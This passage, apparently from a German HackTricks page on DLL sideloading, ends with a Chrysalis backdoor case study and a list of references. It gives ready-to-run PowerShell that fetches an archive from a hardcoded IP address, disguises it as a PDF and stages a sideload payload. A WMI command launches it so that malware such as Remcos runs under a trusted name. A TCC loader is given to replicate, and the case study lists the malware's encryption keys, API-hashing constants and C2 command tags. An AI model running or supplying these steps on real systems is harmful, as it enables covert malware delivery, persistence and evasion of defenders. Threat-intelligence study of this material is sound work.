- **Built-in download/extract:** Lade ein Archiv mit einer benignen Erweiterung herunter, entpacke es und stage das Sideload-Target plus DLL unter einem zufälligen `%LocalAppData%`-Ordner:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` unterdrückt den Fortschritt und folgt Redirects; `tar -xf` nutzt das in Windows eingebaute tar.

- **WMI/CIM launch:** Starte die EXE über WMI, sodass die Telemetrie einen CIM-erstellten Prozess zeigt, während die lokalisierte DLL geladen wird:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funktioniert mit Binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); das Payload (z. B. Remcos) läuft unter dem vertrauenswürdigen Namen.

- **Hunting:** Alarm bei `forfiles`, wenn `/p`, `/m` und `/c` zusammen erscheinen; außerhalb von Admin-Skripten selten.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Eine kürzliche Lotus Blossom-Infektion missbrauchte eine vertrauenswürdige Update-Kette, um einen NSIS-gepackten Dropper zu liefern, der einen DLL sideload plus vollständig in-memory Payloads staged.

Tradecraft flow
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert es als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard `BluetoothService.exe`, eine bösartige `log.dll` und ein verschlüsseltes Blob `BluetoothService` ab und startet die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt das Blob per mmap; `LogWrite` entschlüsselt es mit einem custom LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Key-Material abgeleitet von einem vorherigen Hash), überschreibt den Buffer mit Plaintext-Shellcode, gibt temporäre Speicher frei und springt zu diesem.
- Um eine IAT zu vermeiden, resolved der Loader APIs, indem er Export-Namen hasht mit **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, dann eine Murmur-ähnliche Avalanche anwendet (**0x85EBCA6B**) und gegen gesalzene Ziel-Hashes vergleicht.

Main shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Hauptmodul durch wiederholte add/XOR/sub mit dem Key `gQ2JR&9;` über fünf Durchläufe, lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die Importauflösung abzuschließen.
- Rekonstruiert DLL-Namensstrings zur Laufzeit via pro-Zeichen Bit-Rotate/XOR-Transformationen und lädt dann `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Nutzt einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Export-Tabelle in 4-Byte-Blöcken mit Murmur-ähnlicher Mischung parst und nur auf `GetProcAddress` zurückfällt, wenn der Hash nicht gefunden wird.

Embedded configuration & C2
- Die Konfiguration liegt innerhalb der abgelegten `BluetoothService`-Datei bei **Offset 0x30808** (Größe **0x980**) und ist RC4-entschlüsselt mit Key `qwhvb^435h&*7`, was die C2-URL und den User-Agent offenlegt.
- Beacons bauen ein punktgetrenntes Host-Profil, prependen das Tag `4Q`, dann RC4-verschlüsseln mit Key `vAuig34%^325hGV` bevor `HttpSendRequestA` über HTTPS. Antworten werden RC4-dekodiert und per Tag-Switch dispatcht (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Der Ausführungsmodus wird durch CLI-Args gesteuert: keine Args = Install Persistence (Service/Run-Key) pointing to `-i`; `-i` startet sich selbst mit `-k` neu; `-k` überspringt die Installation und führt das Payload aus.

Alternate loader observed
- Dieselbe Intrusion legte Tiny C Compiler ab und führte `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` aus, mit `libtcc.dll` daneben. Der vom Angreifer gelieferte C-Source bettete Shellcode ein, kompiliert und lief in-memory ohne eine PE auf die Festplatte zu schreiben. Repliziere mit:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Diese TCC-basierte compile-and-run stage importierte zur Laufzeit `Wininet.dll` und lud ein second-stage shellcode von einer hardcoded URL, wodurch ein flexibler loader entstand, der sich als compiler run tarnte.

## Referenzen

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
